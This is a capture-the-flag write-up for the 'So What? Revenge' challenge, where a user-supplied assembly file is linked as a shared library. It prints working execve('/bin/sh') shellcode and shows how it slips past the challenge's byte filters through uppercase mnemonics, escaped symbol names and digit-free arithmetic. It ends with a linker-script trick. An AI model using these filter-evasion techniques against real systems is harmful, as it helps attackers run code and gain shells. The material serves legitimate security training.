# So What? Revenge

## Description

> Are you a shellcoding pro? If not, so what? (salt guaranteed once you know the solution)

{% file src="../../.gitbook/assets/handout.py" %}

## Solution

In this challenge, we were allowed to send an assembly source file that would be assembled with `as`. There are a number of filters that were being applied to our input.

{% code overflow="wrap" %}
```python
last_byte = b""
binary = b""
while True:
    byte = sys.stdin.buffer.read(1)
    binary += byte
    # allow cancer constraints here
    # man, I really wish there was a way to avoid all this pain!!!
    # lmao
    if b"\x80" <= byte < b"\xff": # 1. printable shellcode
        quit()
    if byte in b"/bi/sh": # 2. no shell spawning shenanigans
        quit()
    if b"\x30" <= byte <= b"\x35": # 3. XOR is banned
        quit()
    if b"\x00" <= byte < b"\x05": # 3. ADD is banned
        quit()
    if byte == b"\n" and last_byte == b"\n":
        break
    last_byte = byte
    if len(binary) >= 0x1000:
        exit(1)

with open("libyour_input.so", "wb") as f:
    f.write(binary)

print("Assembling!")

os.system("as libyour_input.so -o libyour_input.obj && ld libyour_input.obj -shared -o libyour_input.so")
```
{% endcode %}

The assembled library is then linked against `main`. A `libflag.so` is also compiled with `flag` defined, allowing it to have the `win()` function.

```python
main_source = """
#include <stdio.h>

extern int win();

#ifdef flag
int win() {
    printf("Congratulations!\\n");
    printf("FLAG_HERE");
}
#endif

int main() {
    win();
}
"""

with open("main.c", "w") as f:
    f.write(main_source)

os.system("gcc main.c -shared -o libflag.so -Dflag")
os.system("gcc main.c -L. -lyour_input -o main")
os.system("LD_LIBRARY_PATH='.' ./main")
```

### Unintended Solution

My unintended solution was to simply tackle the challenge the way it was presented, and evade the filters.

Let's first assume that the filters weren't there. Our goal would be to export a `win` function in our shared library, which is run by `main`. The following shellcode spawns a `/bin/sh` shell.

```nasm
.globl win
win:
    xor    %rdx, %rdx
    mov    $7526411553527181103, %rbx
    shr    $8, %rbx
    push   %rbx
    mov    %rsp, %rdi
    push   %rax
    push   %rdi
    mov    %rsp, %rsi
    mov    $59, %al
    syscall
    ret
```

The first challenge we face is that we cannot have any of the characters in `"/bi/sh"`.

```python
if byte in b"/bi/sh": # 2. no shell spawning shenanigans
    quit()
```

This can be evaded in our instructions by simply using uppercased code (which the assembler accepts), but dealing with the `win` label itself is a bit more tricky. We can't just use `WIN` since that would export a different symbol than the lowercased `win` we need.

We ended up creating the `win` label using `.set`, which expects a symbol name that can be a quoted value. To set the correct address, we use `.` which means the current position.

> `.set` symbol, expression
>
> The `.set` directive assigns the value of expression to symbol. Expression can be any legal expression that evaluates to a numerical value.

Great! This cursed code actually works, and linking it against `main` spawns a shell when running `main`.

```nasm
.GLOBL    "w\x69n"
.SET      "w\x69n", .
    XOR    %RDX, %RDX
    MOV    $7526411553527181103, %RBX
    SHR    $8, %RBX
    PUSH   %RBX
    MOV    %RSP, %RDI
    PUSH   %RAX
    PUSH   %RDI
    MOV    %RSP, %RSI
    MOV    $59, %AL
    SYSCALL
    RET
    
```

The final piece of the puzzle is to get rid of all digits `0` to `5`, since they correspond to the ASCII codes `\x30` to `\x35`.

```python
if b"\x30" <= byte <= b"\x35":
        quit()
```

Since the `MOV` operands are expressions, we could make use of mathematical operations to arrive at the number we need. For instance:

{% code overflow="wrap" %}
```
77768999999999 * 96779 + 788777778*6976 + 6798666 + 6699888 == 7526411553527181103
```
{% endcode %}

And that was just what we needed to complete the shellcode!

```nasm
.GLOBL    "w\x69n"
.SET "w\x69n", .
    XOR    %RDX, %RDX
    MOV    $77768999999999*96779 + 788777778*6976 + 6798666 + 6699888, %RBX
    SHR    $8, %RBX
    PUSH   %RBX
    MOV    %RSP, %RDI
    PUSH   %RAX
    PUSH   %RDI
    MOV    %RSP, %RSI
    MOV    $66-7, %AL
    SYSCALL
    RET
    
```

Popping this into the challenge gives us a shell.

<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 12.34.25 AM.png" alt=""><figcaption></figcaption></figure>

### Intended Solution

The `libflag.so` was there for a reason! Notice that since `os.system()` does not raise an exception if the executed commands error out, we could just write to the `libyour_input.so` directly without ever writing assembly code.

This meant that we could write a [linker script](https://users.informatik.haw-hamburg.de/\~krabat/FH-Labor/gnupro/5\_GNUPro\_Utilities/c\_Using\_LD/ldLinker\_scripts.html) that just links `libflag.so`.

```
INPUT ( -lflag )
```
